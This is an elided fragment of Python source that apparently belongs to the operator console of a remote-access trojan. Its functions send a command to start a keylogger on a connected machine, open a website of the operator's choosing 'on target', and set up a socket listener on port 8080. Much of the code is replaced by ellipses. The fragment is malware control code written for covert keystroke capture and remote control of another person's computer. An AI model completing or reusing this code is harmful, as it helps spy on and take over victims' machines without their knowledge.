...
def keylog():
	...
	conn.send(str.encode("@start@key@logger@"))
	try:
...
def explore_tab():
	conn.send(str.encode("@explore@"))
	print("Enter quit to exit...")

	awn_explore = input("Enter website name: ")
	...
	if awn_explore == ("quit"):
		...
		OS()
		conn.send(str.encode(awn_explore))
		print("The website: " + str(awn_explore) + " has been launched on target...")
		input("Press enter...")
		control()


def setup():
	global socket_, conn, keylog_list, keylog_list_count, address, port
	OS()
	try:
		port = (8080)
